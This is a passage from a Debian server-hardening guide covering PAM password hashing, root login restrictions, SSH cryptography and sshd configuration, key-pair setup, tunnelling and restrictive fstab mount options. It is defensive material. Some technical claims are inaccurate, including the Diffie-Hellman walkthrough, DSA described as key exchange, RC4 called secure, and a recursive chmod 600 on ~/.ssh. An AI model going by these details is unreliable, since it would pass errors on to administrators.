1. In Debian you will need to install the package libpam-unix2
2. Then edit the following files under `/etc/pam.d/`, and change all references to `pam_unix.so` to `pam_unix2.so` in the following files:

* common-account
* common-auth
* common-password, also while you are in this one, replace the current cipher (probably `sha512`) with `blowfish`
* common-session

Passwords that are updated after these modifications are made will be computed using blowfish. Existing shadow passwords are not modified until you change them. So you need to change them immediately (one at a time to start with, please, leave root until last) if you expect them to be using the bcrypt KDF. Do this the same way we did above with the `passwd` command.

Something to be aware of: if the version of libpam-unix2 that you just installed does not support the existing crypt scheme used to create an existing users password, that user may not be able to log in. You can get around this by having root create a new password for that user, because `passwd` will not ask root for that users existing password.

##### Password GRUB

Consider setting a password for GRUB, especially if your server is directly on physical hardware. If it is on a hypervisor, an attacker has another layer to go through before they can access the guest's boot screen.

#### Disable Root Logins from All Terminals
![](images/ThreatTags/PreventionVERYEASY.png)

There are a handful of files to [check and/or modify](https://www.debian.org/doc/manuals/securing-debian-howto/ch4.en.html#s-restrict-console-login) in terms of disabling root logins.

* `/etc/pam.d/login`  
This file, along with the next one, enables the `pam_securetty.so` module. When this file and the next one are properly configured, if root tries to login on an insecure console (that's one that is not listed in the next file), they will not be prompted for a password and will instead receive a message such as the following:  
`pam_securetty(login:auth): access denied: tty '/dev/tty1' is not secure :`  
`Login incorrect`  
Review and understand the contents of this file. There are plenty of comments, and read the [pam_securetty](http://linux.die.net/man/8/pam_securetty) man page, which also refers to other applicable man pages. By default, you may not need to change anything in here. Do check and make sure that the following line, which allows the possibility of logins with null (blank) passwords, has the `nullok` text removed from it:  
`auth       required   pam_unix.so nullok`  
I generally also like to make sure that the following line does not exist, as it allows root to log into the system from the local terminals listed in `/etc/inittab`. A better practise is to only allow low privilege users access to terminals and then elevate privileges once logged in:  
`auth     requisite  pam_securetty.so`  
* `/etc/securetty`  
Root access is allowed to all terminals listed in this file. Take a backup of this file, then modify by commenting out all of the consoles you don't need (preferably all of them), or better still, use the "nothingness" device to send (fill the file with) "nothing"  
`cat /dev/null > /etc/securetty`  
* `/etc/inittab`  
This file contains a list of the virtual consoles / tty devices you have.  
* `/etc/security/access.conf`  
An [alternative](https://www.debian.org/doc/manuals/securing-debian-howto/ch4.en.html#s-pam-rootaccess) to the previous method is to enable the `pam_access` module and make modifications to this file. Currently everything is commented out by default. Enabling this module and configuring it, allows for finer grained access control, but log messages are lacking. I usually don't touch this module.

Now test that you are unable to log into any of the text terminals (TeleTYpewriter, tty) listed in `/etc/inittab`. Usually these can be accessed by [Ctrl]+[Alt]+[F[1, 2, 3, ...]] if you are dealing with a physical machine. If you are dealing with a hypervisor, attempt to log in to the guest's console via the hypervisor management UI as root, in the case of VMware ESX(i) vSphere. You should no longer be able to do so.

Make sure that if your server is not physical hardware and is a VM that the host's password is long and consists of a random mix of upper case, lower case, numbers, and special characters.

#### SSH {#vps-countermeasures-disable-remove-services-harden-what-is-left-ssh}
![](images/ThreatTags/PreventionVERYEASY.png)

We covered fingerprinting of SSH under the Reconnaissance section of the Processes and Practises chapter in [Fascicle 0](https://f0.holisticinfosecforwebdevelopers.com). Here we will discuss:

1. The underlying cyrpto-systems of SSH
2. Determining the authenticity of the server that you are attempting to log in to
3. What you can do to harden SSH

First of all, make sure you are using SSH version 2. Version 1 and its progressions have well documented known vulnerabilities. Version 2 has none at the time of writing this. You can confirm this in multiple ways. The two simplest techniques are as follows:

1. Check the `Protocol` field of `/etc/ssh/sshd_config` on your server, it should say `2`, as in `Protocol 2`
2. Try forcing the use of version 1 and you should be denied.  
`ssh -1 you@your_server`  
# You should see the following:  
`Protocol major versions differ: 1 vs. 2`  
# The following will force version 2  
`ssh -2 you@your_server`

##### Symmetric Cryptosystems

Often referred to as the "secret key" or "shared secret" encryption. In the case of symmetrical encryption, typically only a single key is required for both ends of the communication, or a pair of keys in which a simple transformation is required to establish the relationship between them (not to be confused with how Diffie-Hellman (asymmetric) parties establish their secret keys). The single key should be kept secret by the parties involved in the conversation. This key can be used to both encrypt and decrypt messages.

Some of the commonly used and well known ciphers used for this purpose are the following:

* AES (Advanced Encryption Standard block cipher with either key sizes of 128, 192 or 256 bits, considered highly secure, succeeded DES during the program National Institute of Standards Technology (NIST) began in 1997 for that purpose, which took five years. Approved in December 2001)
* 3DES (block cipher variant of DES. Increases its security by increasing the key length)
* ARCFOUR (or RC4 as a stream cipher, used to be an unpatented trade-secret, until the source code was posted on-line anonymously, RC4 is very fast, but less studied than other algorithms. It is considered secure, providing the caveat of never reusing a key is observed.)
* CAST-128/256 (block cipher described in [Request for Comments (RFC) 2144](http://www.rfc-editor.org/rfc/rfc2144.txt), as a DES-like substitution-permutation crypto algorithm, designed in the early 1990s by Carlisle Adams and Stafford Tavares, available on a worldwide royalty-free basis)
* Blowfish (block cipher invented by Bruce Schneier in 1993, key lengths can vary from 32 to 448 bits. It is much faster than DES and IDEA, though not as fast as ARCFOUR. It has no patents and is intended to be free for all to use. Has received a fair amount of cryptanalytic scrutiny and has proved impervious to attack so far)
* Twofish (block cipher invented by Bruce Schneier, with the help from a few others, submitted in 1998 to the NIST as a candidate for the AES, to replace DES. It was one of the five finalists in the AES selection process out of 15 submissions. Twofish has no patents and is free for all uses. Key lengths can be 128, 192 or 256 bits. Twofish is also designed to be more flexible than Blowfish.)
* IDEA (Bruce Schneier in 1996 [pronounced](http://docstore.mik.ua/orelly/networking_2ndEd/ssh/ch03_09.htm) it "the best and most secure block algorithm available to the public at this time". Omitted from SSH2 because it is patented and requires royalties for commercial use.)

The algorithm selected to be used for encrypting the connection is decided by both the client and server, both must support the chosen cipher. Each is configured to work their way through a list from most preferred to least preferred. Entering `man ssh_config` into a terminal will show you the default order for your distribution.

##### Asymmetric Cryptosystems

Also known as public-key or key-pair encryption, utilises a pair of keys, one which is public and one which by design is to be kept private. You will see where this is used below when we set-up the SSH connection. Below are the most commonly used public-key algorithms: 

* RSA (or Rivest-Shamir-Adleman is the most widely used asymmetric cipher and my preference at this point in time). RSA was claimed to be patented by Public Key Partners, Inc (PKP). The algorithm is now in the public domain, and was added to SSH-2 not long after its patent expired.
* DH (Diffie-Hellman key agreement was the first public-key system published in open literature.) Invented in 1976 and patented in 1977, now expired and in the public domain. It allows two parties to derive a shared secret key (sounds similar to symmetric encryption, but it is not similar) securely over an open channel. "_The parties engage in an exchange of messages, at the end of which they share a secret key. It's not feasible for an eavesdropper to determine the shared secret merely from observing the exchanged messages. SSH-2 uses the DH algorithm as its required (and currently, its only defined) key-exchange method._"
* DSA (or Digital Signature Algorithm was developed by the the National Security Agency (NSA), but covered up by NIST first claiming that it had designed DSA.). Was originally the only key-exchange method for SSH-2
* ECDSA (or Elliptic Curve Digital Signature Algorithm), was accepted in 1999 as an ANSI standard, NIST and IEEE standards in 2000.

##### Hashing

Also known as message digests and one-way encryption algorithms. Hash functions create a fixed-length hash value based on the plain-text. Hash functions are often used to determine the integrity of a file, message, or any other data.

If a given hash function is run on a message twice, the resulting hash value should be identical. Modifying any part of the message has a very high chance of creating an entirely different hash value.

Any given message should not be able to be re-created from its hash.

When the symmetric encryption negotiation is being carried out, a Message Authentication Code (MAC) algorithm is selected from the clients default list of MAC's, the first one that is supported on the server is used. You can see the default list by entering `man ssh_config` into a terminal.

Once the encryption properties are chosen as detailed below in the first step of [SSH Connection Procedure](#vps-countermeasures-disable-remove-services-harden-what-is-left-ssh-ssh-connection-procedure), each message sent must contain a MAC, so that the receiving party can verify the integrity of the message. The MAC is the [result of](https://tools.ietf.org/html/rfc4253):

1. The shared symmetric secret key
2. The packet sequence number of the message
3. The unencrypted message content  

The MAC is sent as the last part of the [binary packet protocol](https://tools.ietf.org/html/rfc4253#section-6).

##### SSH Connection Procedure {#vps-countermeasures-disable-remove-services-harden-what-is-left-ssh-ssh-connection-procedure}

The two main stages of establishing the connection are:

1. Establish the session encryption
2. Authenticate the client to the server (should the user be allowed access to the server)

The following are the details for each:

**Establish the session encryption**

The SSH client is responsible for initiating the TCP handshake with the server. The server responds with the protocol versions it supports, if the client can support one of the protocol versions from the server, the process continues. The server also provides its public (asymmetric) host key. The client verifies that the server is known to it, by checking that the public host key sent from the server is in the clients:  
`~/.ssh/known_hosts`

This record is added on first connection to the server, as detailed in the section ["Establishing your SSH Servers Key Fingerprint"](#vps-countermeasures-disable-remove-services-harden-what-is-left-ssh-establishing-your-ssh-servers-key-fingerprint) below.

At this stage, a session key is negotiated between the client and server using Diffie-Hellman (DH) as an ephemeral (asymmetric) key exchange algorithm, each combining their own private data with public data from the other party. This allows both parties to arrive at the same identical secret symmetric session key. The public and private key pairs used to create the shared secret key in this stage have nothing to do with the client authenticating to the server.

Now in a little more detail, the Diffie-Hellman key agreement works like this:

1. Both client and server come to agreement on a seed value, commonly a large prime number
2. Both client and server agree on a symmetric cipher, so that they are both encrypting/decrypting with the same block cipher, usually AES
3. Each party then creates another prime number of their own to be used as a private key for this ephemeral DH interaction
4. Each party then create a public key which they exchange with the other party. These public keys are created using the symmetric cipher from step 2, the shared prime number from step 1, and derived from the private key from step 3
5. The party receiving the other party's public key, uses this, along with their own private key, and the shared prime number from step 1 to compute their own secret key. Because each party does the same, they both arrive at the same (shared/symmetric/secret) key
6. All communications from here on are encrypted with the same shared secret key, the connection from here on is known as the *binary packet protocol*. Each party can use their own shared secret key to encrypt and decrypt, messages from the other party

**Authenticate the client to the server**

The second stage is to authenticate the client, establishing whether they should be communicating with the server. There are several methods for doing this, the two most common are passwords and key-pair. SSH defaults to passwords, as the lowest common denominator, plus it often helps to have password authentication set-up in order to set-up key-pair authentication, especially if you don't have physical access to the server(s).

SSH key pairs are asymmetric. The server holds the client's public key and is used by the server to encrypt messages that it uses to authenticate the client. The client in turn receives the messages from the server and decrypts them with the private key. If the public key falls into the wrong hands, it's no big deal, because the private key cannot be deduced from the public key, and the authentication public key is used only for verifying that the client holds the private key for it.

The authentication stage continues directly after the encryption has been established from the previous step.  

1. The client sends the Id of the key pair they want to authenticate as to the server
2. The server checks the `~/.ssh/authorized_keys` file for the Id of the public keys account that the client is authenticating as
3. If there is a matching Id for a public key within `~/.ssh/authorized_keys`, the server creates a random number and encrypts it with the public key that had a matching Id
4. The server then sends the client this encrypted number
5. Now the client needs to prove that it has the matching private key for the Id it sent the server. It does this by decrypting the message the server just sent with the private key, revealing the random number created on the server.
6. The client then combines the number from the server with the shared session key produced in the session encryption stage and obtains the MD5 hash from this value.
7. The client then sends the hash back in response to the server.
8. The server then does the same as the client did in step 6 with the number that it generated, combining it with the shared session key and obtaining the MD5 hash from it. The server then compares this hash with the hash that the client sent it. If they match, then the server communicates to the client that it is successfully authenticated.

Below in the [Key-pair Authentication](#vps-countermeasures-disable-remove-services-harden-what-is-left-ssh-key-pair-authentication) section, we work through manually (hands on) setting up key-pair authentication.

##### Establishing your SSH Servers Key Fingerprint {#vps-countermeasures-disable-remove-services-harden-what-is-left-ssh-establishing-your-ssh-servers-key-fingerprint}

When you connect to a remote host via SSH that you have not established a trust relationship with before, you are going to be told that the authenticity of the host your attempting to connect to cannot be established.

{linenos=off, lang=Bash}
    you@yourbox ~ $ ssh you@your_server
    The authenticity of host 'your_server (your_server)' can't be established.
    RSA key fingerprint is 23:d9:43:34:9c:b3:23:da:94:cb:39:f8:6a:95:c6:bc.
    Are you sure you want to continue connecting (yes/no)?

Do you type yes to continue without actually knowing that it is the host you think it is? Well, if you do, you should be more careful. The fingerprint that is being put in front of you could be from a Man In the Middle (MItM). You can query the target (from "its" shell of course) for the fingerprint of its key easily. On Debian you will find the keys in `/etc/ssh/`

When you enter the following:

`ls /etc/ssh/`

you should get a listing that reveals the private and public keys. Run the following command on the appropriate key to reveal its fingerprint.

For example if SSH is using rsa:

`ssh-keygen -lf ssh_host_rsa_key.pub`

For example if SSH is using dsa:

`ssh-keygen -lf ssh_host_dsa_key.pub`

If you try the command on either the private or public key you will be given the public key's fingerprint, which is exactly what you need for verifying the authenticity from the client side.

Sometimes you may need to force the output of the fingerprint_hash algorithm, as ssh-keygen may be displaying it in a different form than it is shown when you try to SSH for the first time. The default when using ssh-keygen to show the key fingerprint is sha256, unless it is an old version, but in order to compare apples with apples, you may need to specify md5 if that is what is being shown when you attempt to login. You would do that by issuing the following command:

`ssh-keygen -lE md5 -f ssh_host_dsa_key.pub`

If that does not work, you can specify md5 from the client side with:

`ssh -o FingerprintHash=md5 <your_server>`

Alternatively this can be specified in the clients `~/.ssh/config` file as per the following, but I would not recommend this, as using md5 is [less secure](https://en.wikipedia.org/wiki/MD5#Security).

{linenos=off, lang=Bash}
    Host <your_server>
        FingerprintHash md5

Prior to [OpenSSH 6.8](http://www.openssh.com/txt/release-6.8) the fingerprint was provided as a hexadecimal md5 hash. Now it is displayed as base64 sha256 by default. You can check which version of SSH you are using with:

{linenos=off, lang=Bash}
    sshd -v

You can find additional details on the man pages for the options, both ssh-keygen and ssh.

Do not connect remotely and then run the above command, as the machine you are connected to is still untrusted. The command could be serving you any string replacement if it is an attackers machine. You need to run the command on the physical box, or get someone you trust (your network admin) to do this and hand you the fingerprint.

Now when you try to establish your SSH connection for the first time, you can check that the remote host is actually the host you think it is by comparing the output of one of the previous commands with what SSH on your client is telling you the remote host's fingerprint is. If it is different, it is time to start tracking down the origin of the host masquerading as the address your trying to log in to.

If you get the following message when attempting to SSH to your server, due to something or somebody changing the host's key fingerprint:

{linenos=off, lang=Bash}
    @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
    @    WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!     @
    @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
    IT IS POSSIBLE THAT SOMEONE IS DOING SOMETHING NASTY!
    Someone could be eavesdropping on you right now (man-in-the-middle attack)!
    It is also possible that a host key has just been changed.
    The fingerprint for the RSA key sent by the remote host is
    23:d9:43:34:9c:b3:23:da:94:cb:39:f8:6a:95:c6:bc.
    Please contact your system administrator.
    Add correct host key in /home/me/.ssh/known_hosts to get rid of this message.
    Offending RSA key in /home/me/.ssh/known_hosts:6
      remove with: ssh-keygen -f "/home/me/.ssh/known_hosts" -R your_server
    RSA host key for your_server has changed and you have requested strict checking.
    Host key verification failed.

then the same applies. Check that the fingerprint is indeed the intended target host's key fingerprint. If it is, you can continue to log in.

Now, when you type `yes`, the fingerprint is added to your clients:  
`/home/you/.ssh/known_hosts` file,  
so that next time you try and login via SSH, your client will already know your server.

##### Hardening SSH {#vps-countermeasures-disable-remove-services-harden-what-is-left-ssh-hardening-ssh}

There are a bunch of things you can do to minimise SSH being used as an attack vector. Let's walk through some now.

After any changes, restart SSH daemon as root (using sudo) to apply the changes.

{linenos=off, lang=Bash}
    service ssh restart

You can check the status of the daemon with the following command:

{linenos=off, lang=Bash}
    service ssh status

**Configuring which hosts can access your server**

This can be done with a firewall, or at a lower level which I prefer. The two files you need to know about are: `/etc/hosts.deny` and `/etc/hosts.allow`. The names of the files explain what they contain. `hosts.deny` contains addresses of hosts which are blocked, `hosts.allow` contains addresses of hosts which are allowed to connect.

If you wanted to allow access to the SSH daemon from `1.1.1.x` and `10.0.0.5`, but no others, you would set-up the files like the following:

{title="/etc/hosts.allow", linenos=off, lang=Bash}
    sshd: 1.1.1.0/255.255.255.0   # Access to all 254 hosts on 1.1.1.0/24
    sshd: 10.0.0.5                # Just the single host.

{title="/etc/hosts.deny", linenos=off, lang=Bash}
    ALL: ALL

If you wanted to deny all only to SSH, so that users not listed in `hosts.allow` could potentially log into other services, you would set the `hosts.deny` up as follows:

{title="/etc/hosts.deny", linenos=off, lang=Bash}
    sshd: ALL

There are also commented examples in the above files and check the man page for all of the details.

{#vps-countermeasures-disable-remove-services-harden-what-is-left-sshd_config}
**Changes to the servers `/etc/ssh/sshd_config` file**

To tighten security up considerably, make the necessary changes to your servers:  
`/etc/ssh/sshd_config` file.  
Start with the changes I list here. It is a good idea when you change things such as setting up `AllowUsers`, or any other potential changes that could lock you out of the server, to be logged in via one shell when you exit another and test it. This way if you have locked yourself out, you will still be logged in on one shell to adjust the changes you have made. Unless you have a need for multiple users, you can lock it down to a single user. You can even lock it down to a single user from a specific host.

{title="/etc/ssh/sshd_config", linenos=off, lang=Bash}
    # If specified, login is allowed only for users that match one of the patterns.
    # Also consider DenyUsers, DenyGroups, AllowGroups.
    # Only allow kim, mydog, mycat, myrat to login.
    # Patterns like kim@10.0.0.5 are also allowed and would only allow kim to login from 10.0.0.5
    AllowUsers kim mydog mycat, myrat

    # Deny specific users you, and maninthemoon.
    DenyUsers you, maninthemoon

    # You really don't want root to be able to log in if at all possible.
    PermitRootLogin no

    # Change the LoginGraceTime (seconds) to as small as possible number.
    LoginGraceTime 30

    # Set PasswordAuthentication to no once you get key pair auth set-up.
    PasswordAuthentication no
    PubkeyAuthentication yes

    PermitEmptyPasswords no

    # Consider using a non default port below 1025 that only root can bind to
    # in order to stop the sshd being swapped. This actually stops a lot of
    # noise if your web server is open to the internet, as many automated scanns target port 22.
    Port 202

As you can see, these changes are very simple, but many people do not do it. Every positive security change you make to low hanging fruit elevates it that much higher for the attacker to reach, making it less economical for them.

You can also consider installing and configuring [denyhosts](https://www.digitalocean.com/community/articles/how-to-install-denyhosts-on-ubuntu-12-04)

Check SSH login attempts. As root or via sudo, type the following to see all failed login attempts:

{linenos=off, lang=Bash}
    cat /var/log/auth.log | grep 'sshd.*Invalid'
    # Or list the bad login attempts from /var/log/btmp unless modified by an attacker.
    lastb -ad

If you want to see successful logins, enter the following:

{linenos=off, lang=Bash}
    cat /var/log/auth.log | grep 'sshd.*opened'
    # Or list the last logged in users from /var/log/wtmp unless modified by an attacker.
    last -ad

If you are sending your logs off-site in real-time, it will not matter too much if the attacker tries to cover their tracks by modifying these types of files. If you are checking the integrity of your system files frequently with one of the Host Intrusion Detection Systems ([HIDS](#vps-countermeasures-lack-of-visibility-host-intrusion-detection-systems-hids)), then you will know you are under attack, and will be able to take measures quickly, provided that you have someone engaged watching out for these attacks, as discussed in the People chapter of Fascicle 0 and further in this chapter. If your HIDS is on the same machine that is under attack, then it is quite likely that any decent attacker is going to find it before they start modifying files and somehow render it ineffective. That is where [Stealth](#vps-countermeasures-lack-of-visibility-host-intrusion-detection-systems-hids-deeper-with-stealth) shines, as it is so much harder to find where it is operating from, assuming the attacker even knows it is there.

{#vps-countermeasures-disable-remove-services-harden-what-is-left-ssh-key-pair-authentication}
**Key-pair Authentication**

The details around how the client authenticates to the server are above in Part 2 of the [SSH Connection Procedure](#vps-countermeasures-disable-remove-services-harden-what-is-left-ssh-ssh-connection-procedure) section. This section shows you how to set-up key-pair authentication, as opposed to password authentication.

Make sure you use a long passphrase (this is your second factor of authentication) for your key-pair, that you store in a password vault with all your other passwords. You are using a decent password vault right? If your passphrase and private key is compromised, your hardening effort will be softened or compromised.

My feeling after a lot of reading is that currently RSA with large keys (The default RSA size is 2048 bits) is a good option for key-pair authentication. Personally, I like to go for 4096 these days.

Create your key-pair if you have not already and set-up key-pair authentication. Key-pair auth is more secure and allows you to log in without a password. Your passphrase should be stored in your keyring. You will just need to provide your local password once (each time you log into your local machine) when the keyring prompts for it.

On your client machine you want to create the key-pair and store them:

{linenos=off, lang=Bash}
    ssh-keygen -t rsa -b 4096
    
Agree to the location that `ssh-keygen` wants to store the keys... `/home/you/.ssh`

Enter a passphrase twice to confirm. Keys are now in `/home/you/.ssh`

Optionally, the new private key can be added to `id_rsa.keystore` if it hasn't already been:

{linenos=off, lang=Bash}
    ssh-add id_rsa

Then enter your passphrase.

Now we need to get the public key that we have just created (`~/.ssh/id_rsa.pub`) from our client machine into our servers `~/.ssh/` directory.  
You can `scp` it, but this means also logging into the server and creating the:  
`~/.ssh/authorized_keys` file if it does not already exist,  
and appending (`>>`) the contents of id_rsa.pub to `~/.ssh/authorized_keys`. There is an easier way, and it goes like this, from your client machine:

{linenos=off, lang=Bash}
    ssh-copy-id "you@your_server -p [your non default port]"

This will copy the public key straight into the `~/.ssh/authorized_keys` file on your_server. You may be prompted to type `yes` if this is the first time you have connected to the server, as the authenticity of the server you are trying to connect to cannot be established and you want to continue. I mentioned this above in the [Establishing your SSH Servers Key Fingerprint](#vps-countermeasures-disable-remove-services-harden-what-is-left-ssh-establishing-your-ssh-servers-key-fingerprint) section. Make sure you check the servers Key Fingerprint and do not just blindly accept it, as this is where our security solutions break down due to human defects.

Also, make sure the following permissions and ownership on the server are correct:

{#vps-countermeasures-disable-remove-services-harden-what-is-left-ssh-key-pair-authentication-ssh-perms}
{linenos=off, lang=Bash}
    chmod go-w ~/
    # Everything in the ~/.ssh dir needs to be chmod 600
    chmod -R 600 ~/.ssh
    # Make sure you are the owner of authorized_keys also.
    chown [you] authorized_keys

##### Tunnelling SSH {#vps-countermeasures-disable-remove-services-harden-what-is-left-ssh-tunneling-ssh}

You may need to tunnel SSH once the server is placed into the DMZ. Usually this will be set-up on your router. If you are on the outside of your network, you will just SSH to your external IP address.

{linenos=off, lang=Bash}
    # The -A option is useful for hopping from your network internal server to other servers.
    ssh your_webserver_account@your_routers_wan_interface -A -p [router wan non default port] 

If you want to SSH from your LAN host to your DMZ web server:

{linenos=off, lang=Bash}
    ssh your_webserver_account@your_routers_lan_interface -p [router wan non default port] 

Before you try that though, you will need to set up the port forwards and add the WAN and/or LAN rule to your router. How you do this will depend on what you are using for a router.

I have blogged extensively over the years on SSH. In the Additional Resources chapter there are links to my resources which have a plethora of information on configuring and using SSH in many different ways.

**sshuttle**

I just thought I would throw sshuttle in here as well, though it has nothing to do with hardening SSH, but it is a very useful tool for tunneling SSH. Think of it as a poor mans VPN, but it does some things better than the likes of OpenVPN, like forcing DNS queries through the tunnel also. It is very simple to run.

{linenos=off, lang=Bash}
    # --dns: capture and forward local DNS requests
    # -v: verbosity, -r: remote
    # 0/0: forwards all local traffic over the SSH channel.
    sshuttle --dns -vvr your_shell_account@your_ssh_shell 0/0
    # That is it, now all comms go over your SSH tunnel. So simple. Actually easier than a VPN.

It's a pain to manually specify socks and then tell your browser to proxy through `localhost`, and use the same port you defined after the socks (`-D`) option, and then do the same for any other programmes that want to use the same tunnel:
   
{linenos=off, lang=Bash}
    ssh -D [any spare port] your_shell_account@your_ssh_shell
    # Now go set up proxies for all consumers. What a pain!
    # On top of that, DNS queries are not forced through the tunnel,
    # So censorship can still bite you.

Dnscrypt can help conceal DNS queries, but that would be more work. Another offering I've used is the [bitmask](https://bitmask.net/) VPN [client](https://dl.bitmask.net/linux/) which does a lot more than traditional VPN clients. Bitmask starts an egress firewall that rewrites all DNS packets to use the VPN. Bitmask is sponsored by the [LEAP Encryption Access Project](https://leap.se/) and looks very good, I've used it, and the chaps on the #riseup IRC channel on the indymedia server are really helpful too. Bitmask works on Debian, Ubuntu, and Mint 17, but not so well on Mint 18 when I tried it, but this will probably change.

#### Disable Boot Options
![](images/ThreatTags/PreventionVERYEASY.png)

All the major hypervisors should provide a way to disable all boot options other than the device you will be booting from. VMware allows you to do this in vSphere Client.

While you are at it, [set](http://kb.vmware.com/selfservice/microsites/search.do?language=en_US&cmd=displayKC&externalId=1004129) a BIOS password.

#### Lock Down Partition Mounting {#vps-countermeasures-disable-remove-services-harden-what-is-left-lock-down-the-mounting-of-partitions}
![](images/ThreatTags/PreventionAVERAGE.png)

**File Permission and Ownership Level**

Addressing the [first risk](#vps-identify-risks-unnecessary-and--vulnerable-services-overly-permissive-file-permissions-ownership-and-lack-of-segmentation-mitigations) as discussed in the "[Overly Permissive File Permissions, Ownership and Lack of Segmentation](#vps-identify-risks-unnecessary-and--vulnerable-services-overly-permissive-file-permissions-ownership-and-lack-of-segmentation)" section of the Identify Risks section:

Locate the files with overly permissive permissions and ownership. Run the suggested tools as a good place to start. From there, follow your instincts to find any others. Then tighten up permissions so that they conform to the least amount of privilege and ownership necessary in order for the legitimate services/activities to run. Also consider removing any `suid` bits on executables `chmod u-s <yourfile>`. We also address applying `nosuid` to our mounted file systems below, which provides a nice safety net.

**Mount Point of the File Systems**

Addressing the [second risk](#vps-identify-risks-unnecessary-and--vulnerable-services-overly-permissive-file-permissions-ownership-and-lack-of-segmentation-mitigations) as discussed in the "[Overly Permissive File Permissions, Ownership and Lack of Segmentation](#vps-identify-risks-unnecessary-and--vulnerable-services-overly-permissive-file-permissions-ownership-and-lack-of-segmentation)" section of the Identify Risks section:

Start with your `fstab`.

Make a backup of your `/etc/fstab` file before you make changes, this is really important. It is often really useful to just swap the modified `fstab` with the original as you are progressing through your modifications. Read the man page for fstab and also the options section in the mount man page. The Linux File System Hierarchy ([FSH](http://www.tldp.org/LDP/Linux-Filesystem-Hierarchy/html/index.html)) documentation is worth consulting as well specific to directory usage. The following is my work-flow:

Before you modify and remount `/tmp`, view what its currently mounted options are with:

{linenos=off, lang=Bash}
    mount | grep ' /tmp'

Add the `noexec` mount option to `/tmp` but not `/var` because executable shell scripts such as `*pre[inst, rm]` and `*post[inst, rm]` reside within `/var/lib/dpkg/info`. You can also add the `nodev,nosuid` options to `/tmp`.

You should have the following line in `/etc/fstab`:

{title="/etc/fstab", linenos=off, lang=Bash}
    UUID=<block device ID goes here> /tmp ext4 defaults,noexec,nodev,nosuid 0 2

Then apply the new options from `/etc/fstab`:

{linenos=off, lang=Bash}
    sudo mount -o remount /tmp

Issue the `sudo mount | grep ' /tmp'` command again, you'll see your new options applied.

You can add the `nodev` option to `/home`, `/opt`, `/usr` and `/var` as well. You can also add the `nosuid` option to `/home` and `ro` to `/usr`

You should now have the following lines, as well as the above `/tmp` in `/etc/fstab`:

{title="/etc/fstab", linenos=off, lang=Bash}
    UUID=<block device ID goes here> /home ext4 defaults,nodev,nosuid 0 2
    UUID=<block device ID goes here> /opt ext4 defaults,nodev 0 2
    UUID=<block device ID goes here> /usr ext4 defaults,nodev,ro 0 2
    UUID=<block device ID goes here> /var ext4 defaults,nodev 0 2

Before you remount the above changes, you can view the options for the current mounts:

{linenos=off, lang=Bash}
    mount

Then remount the mounts you have just specified in your `fstab` above:

{linenos=off, lang=Bash}
    sudo mount -o remount /home
    sudo mount -o remount /opt
    sudo mount -o remount /usr
    sudo mount -o remount /var

Now have a look at the changed options applied to your mounts:

{linenos=off, lang=Bash}
    mount

You can now bind some target [mounts onto existing directories](http://www.cyberciti.biz/faq/linux-add-nodev-nosuid-noexec-options-to-temporary-storage-partitions/). I had only limited success with this technique, so keep reading. The lines to add to the `/etc/fstab` are as per the following. The file system type should be specified as `none` (as stated in the “The bind mounts” section of the [mount](http://man.he.net/man8/mount) man page. The `bind` option binds the mount. There was a bug with the suidperl package in Debian where setting `nosuid` created an insecurity, suidperl is no longer available in Debian:

{title="/etc/fstab", linenos=off, lang=Bash}
    /var/tmp /var/tmp none rw,noexec,nosuid,nodev,bind 0 2
    /var/log /var/log none rw,noexec,nosuid,nodev,bind 0 2
    /usr/share /usr/share none nodev,nosuid,bind 0 2

Before you remount the above changes, you can view the options for the current mounts:

{linenos=off, lang=Bash}
    mount

Then remount the above immediately, thus taking effect before a reboot. This is the safest way, as if you get the mounts incorrect, your system may fail to boot in some cases, which means you will have to boot a live CD to modify the `/etc/fstab`. Execute the following commands:

{linenos=off, lang=Bash}
    sudo mount --bind /var/tmp /var/tmp
    sudo mount --bind /var/log /var/log

Then to pick up the new options from `/etc/fstab`:

{linenos=off, lang=Bash}
    sudo mount -o remount /var/tmp
    sudo mount -o remount /var/log
    sudo mount -o remount /usr/share

Now have a look at the changed options applied to your mounts.

For further details consult the remount option of the mount man page.

At any point you can check the options that you have your directories mounted as, by issuing the following command:

{linenos=off, lang=Bash}
    mount

&nbsp;

As mentioned above, I had trouble adding these mounts to existing directories, and was not able to get all options applied. So I decided to take another backup of the VM (I would highly advise you to do the same if you are following along) and run the machine from a live CD (Knoppix in my case). I ran Disk Usage Analyser to work out which sub directories of `/var` and `/usr` were using too much disk space and see how to reduce the sizes of the partitions that `/var` and `/usr` were mounted on in order to provide that space to sub directories (`/var/tmp`, `/var/log` and `/usr/share`) on new partitions.  
Run gparted and unmount the relevant directory from its partition (`/var` from `/dev/sda5`, and `/usr` from `/dev/sda8` in this case). Reduce the size of the partitions, by the size of the new partitions you want taken from it. Locate the unallocated partition of the size that you just reduced the partition you were working on, and select new from the context menu. Set the File system type to `ext4` and click Add -> Apply All Operations -> Apply. You now should have the new partition.

Now you will need to mount the original partition that you resized and the new partition. Open a terminal with an extra tab. In the left terminal go to where you mounted the original partition (`/media/sda5/tmp/` for example), in the right terminal go to where you mounted the new partition (`/media/sda11/` for example).

Copy all in the current directory of the left terminal recursively, preserving all attributes other than hard links.

{linenos=off, lang=Bash}
    # -a (archive), -v (verbose), -z (compress)
    /media/sda5/share# rsync -avz * /media/sda11/

Once you have confirmed the copy, delete all in `/media/sda5/tmp/`

Back in gparted, mount `/dev/sda1` so we can modify the `/etc/fstab`. By running the `blkid` command you will be given the UUID for the partition to use in the `/etc/fstab`. Modify the `/media/sda1/etc/fstab` to look similar to the below sample `fstab`. Do the same for `/var/log` and `/usr/share`.

{title="/etc/fstab", linenos=off, lang=Bash}
    # /etc/fstab: static file system information.
    #
    # Use 'blkid' to print the universally unique identifier for a
    # device; this may be used with UUID= as a more robust way to name devices
    # that works even if disks are added and removed. See fstab(5).
    #
    # <file system> <mount point> <type> <options> <dump> <pass>
    # / was on /dev/sda1 during installation
    UUID=<block device ID goes here> / ext4 errors=remount-ro 0       1
    # /home was on /dev/sda9 during installation
    UUID=<block device ID goes here> /home ext4 defaults,nodev,nosuid 0 2
    # /opt was on /dev/sda7 during installation
    UUID=<block device ID goes here> /opt ext4 defaults,nodev 0 2
    # /tmp was on /dev/sda6 during installation
    UUID=<block device ID goes here> /tmp ext4 defaults,noexec,nodev,nosuid 0 2
    # /usr was on /dev/sda8 during installation
